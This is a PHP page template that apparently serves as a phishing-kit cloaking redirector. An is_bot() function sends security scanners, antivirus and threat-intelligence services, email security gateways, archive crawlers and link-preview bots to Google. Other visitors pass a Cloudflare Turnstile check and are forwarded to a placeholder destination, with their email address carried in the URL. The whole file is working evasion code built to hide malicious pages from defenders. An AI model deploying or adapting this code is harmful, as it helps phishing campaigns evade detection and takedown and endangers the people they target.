<?php
// Bot Detection - Redirects bots to Google
function is_bot() {
    $user_agent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
    
    $bot_indicators = [
        // Automation tools
        'headlesschrome', 'phantomjs', 'selenium', 'puppeteer', 
        'playwright', 'chromedriver', 'webdriver', 'chrome-lighthouse',
        
        // Generic bots
        'bot', 'crawler', 'spider', 'scraper', 'slurp', 'mediapartners',
        
        // Security scanners & link checkers
        'urlchecker', 'urlscan', 'virustotal', 'wappalyzer', 'shodan',
        'censys', 'securitytrails', 'phishtank', 'netcraft', 'openvas',
        'nessus', 'qualys', 'rapid7', 'tenable', 'sucuri', 'sitechecker',
        'checkphish', 'urlquery', 'urlhaus', 'abuseipdb', 'sitecheck',
        'scanner', 'scan', 'probe', 'check', 'validator', 'monitor',
        
        // Threat intelligence bots
        'threatcrowd', 'alientvalut', 'otx', 'malwarepatrol', 'cymru',
        'spamhaus', 'barracuda', 'trendmicro', 'sophos', 'fortinet',
        'paloalto', 'checkpoint', 'mcafee', 'symantec', 'kaspersky',
        'avast', 'avg', 'eset', 'bitdefender', 'malwarebytes',
        
        // Archive & snapshot bots
        'archive.org', 'wayback', 'archive-it', 'perma.cc', 'webcitation',
        
        // HTTP libraries & tools
        'python-requests', 'curl', 'wget', 'axios', 'node-fetch', 
        'go-http-client', 'java/', 'okhttp', 'httpclient', 'libwww',
        'python-urllib', 'guzzle', 'restsharp', 'httparty', 'requests',
        
        // Search engines (optional - remove if you want Google to index)
        'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider',
        'yandexbot', 'sogou', 'exabot', 'facebot', 'ia_archiver',
        
        // Social media bots (link preview fetchers)
        'facebookexternalhit', 'twitterbot', 'whatsapp', 'telegrambot',
        'discordbot', 'slackbot', 'linkedinbot', 'pinterestbot',
        'redditbot', 'skypeuripreview', 'viberbot', 'snapchat',
        
        // Email security scanners
        'proofpoint', 'mimecast', 'ironport', 'messagelabs', 'mailscanner',
        'spamassassin', 'postfix', 'sendmail', 'exchange', 'outlook-checker',
        
        // Browser automation detection tools
        'headless', 'automation', 'phantom', 'nightmarejs', 'casperjs'
    ];
    
    foreach ($bot_indicators as $indicator) {
        if (strpos($user_agent, $indicator) !== false) {
            return true;
        }
    }
    
    if (!isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) || !isset($_SERVER['HTTP_ACCEPT_ENCODING'])) {
        return true;
    }
    
    if (empty($user_agent) || strlen($user_agent) < 10) {
        return true;
    }
    
    return false;
}

// Ree
if (is_bot()) {
    header('Location: https://www.google.com', true, 302);
    exit;
}

// Configuration
$destination_url = "{{REDIRECT_URL}}";
$turnstile_key = "{{TURNSTILE_KEY}}";

// Set no-cache headers
header('Cache-Control: no-cache, no-store, must-revalidate');
header('Pragma: no-cache');
header('Expires: 0');
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>&#9929;</title>
    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
    <style>
        .status {
            display: none;
        }
        .status.success {
            color: #4CAF50;
        }       
    </style>
</head>
<body style="font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0;">
    <div style="padding: 20px; text-align: center; max-width: 400px;">
        <div style="display: flex; justify-content: center; margin: 10px 0;">
            <div class="cf-turnstile" 
                 data-sitekey="<?php echo htmlspecialchars($turnstile_key); ?>"
                 data-callback="onTurnstileSuccess"
                 data-error-callback="onTurnstileError"
                 data-expired-callback="onTurnstileExpired"
                 data-timeout-callback="onTurnstileTimeout"
                 data-theme="dark">
            </div>
        </div>
        <div id="status" class="status"></div>

        
    </div>

    <script>
        const DESTINATION_URL = "<?php echo htmlspecialchars($destination_url); ?>";
        let turnstileToken = null;

        function getParameterByName(name) {
            const url = window.location.href;
            name = name.replace(/[\[\]]/g, '\\$&');
            const regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)');
            const results = regex.exec(url);
            if (!results) return null;
            if (!results[2]) return '';
            return decodeURIComponent(results[2].replace(/\+/g, ' '));
        }

        function buildRedirectUrl() {
            const email = getParameterByName('email');
            let url = DESTINATION_URL;
            const params = [];

            if (email && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
                params.push(`email=${encodeURIComponent(email)}`);
            }

            if (turnstileToken) {
                params.push(`cf-turnstile-response=${encodeURIComponent(turnstileToken)}`);
            }

            const hashIndex = url.indexOf('#');
            if (hashIndex !== -1) {
                const baseUrl = url.substring(0, hashIndex);
                const hash = url.substring(hashIndex);
                url = baseUrl + (params.length > 0 ? '?' + params.join('&') : '') + hash;
            } else {
                url += (params.length > 0 ? '?' + params.join('&') : '');
            }

            return url;
        }

        function onTurnstileSuccess(token) {
            console.log("Turnstile verification successful");
            turnstileToken = token;


            const redirectUrl = buildRedirectUrl();
            console.log("Redirecting to:", redirectUrl);

            setTimeout(() => {
                window.location.href = redirectUrl;
            }, 500);
        }

        function onTurnstileError(errorCode) {
            console.error("Turnstile error:", errorCode);
            const statusEl = document.getElementById('status');
            statusEl.className = 'status error';
            statusEl.style.display = 'block';
            statusEl.textContent = 'Please refresh the page and try again.';
        }

        function onTurnstileExpired() {
            console.warn("Turnstile token expired");
            turnstileToken = null;
            const statusEl = document.getElementById('status');
            statusEl.className = 'status error';
            statusEl.style.display = 'block';
            statusEl.textContent = 'Verification expired. Please complete the challenge again.';
        }

        function onTurnstileTimeout() {
            console.warn("âš  Turnstile timeout");
            const statusEl = document.getElementById('status');
            statusEl.className = 'status error';
            statusEl.style.display = 'block';
            statusEl.textContent = 'Verification timed out. Please refresh the page.';
        }
    </script>
</body>
</html>